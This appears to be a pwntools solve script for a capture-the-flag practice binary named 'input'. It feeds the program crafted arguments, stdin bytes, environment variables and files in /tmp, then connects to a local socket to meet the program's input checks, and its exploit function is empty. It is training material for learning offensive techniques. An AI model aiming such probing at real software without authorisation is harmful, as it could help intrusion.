#!/usr/bin/env python
# -=-<[ Bismillahirrahmanirrahim ]>-=-
# -*- coding: utf-8 -*-
# @Date    : 2022-04-23 22:39:15
# @Author  : Dahir Muhammad Dahir (dahirmuhammad3@gmail.com)
# @Link    : link
# @Version : 1.0.0


from pwn import *
from pwn import p8, p32, p64
# import angr

context.arch = "amd64"

filename = "./input"
# binary_target = ELF(filename)
# target_process = process(filename)


def exploit():
    pass


def solve():
    args = ["/home/input2/input"]
    for i in range(1, 100):
        args.append(str(i))
    args[65] = p8(0)
    args[66] = b"\x20\x0a\x0d"
    args[67] = "4138"
    tempfile = open("/tmp/dahir/somefile", "wb")
    tempfile.write(b"\x00\x0a\x02\xff")
    tempfile.close()
    tempfile = open(b"/tmp/dahir/\x0a", "wb")
    tempfile.write(b"\x00\x00\x00\x00")
    tempfile.close()
    f = open("/tmp/dahir/somefile", "rb")
    solve_process = process(args, stderr=f, env={b"\xde\xad\xbe\xef": b"\xca\xfe\xba\xbe"}, cwd="/tmp/dahir/")
    solve_process.send(b"\x00\x0a\x00\xff")
    raw_input()
    conn = remote("localhost", 4138)
    conn.send(b"\xde\xad\xbe\xef")
    print(solve_process.recvall(timeout=3))
    print(conn.recvall(timeout=3))
    solve_process.interactive()



def debug():
    gdbscript = """
    break main
    """
    args = ["./input"]
    for i in range(1, 100):
        args.append(str(i))
    
    args[65] = p8(0)
    args[66] = b"\x20\x0a\x0d"
    args[67] = "4135"

    f = open("somefile", "rb")
    # g = open(b"\x0a", "rb")

    debug_process = process(args, stderr=f, env={b"\xde\xad\xbe\xef": b"\xca\xfe\xba\xbe"})
    gdb.attach(debug_process, gdbscript=gdbscript)
    debug_process.send(b"\x00\x0a\x00\xff")
    input()
    conn = remote("localhost", 4135)
    conn.send(b"\xde\xad\xbe\xef")
    debug_process.interactive()


if __name__ == "__main__":
    debug()
    # exploit()
    # solve()

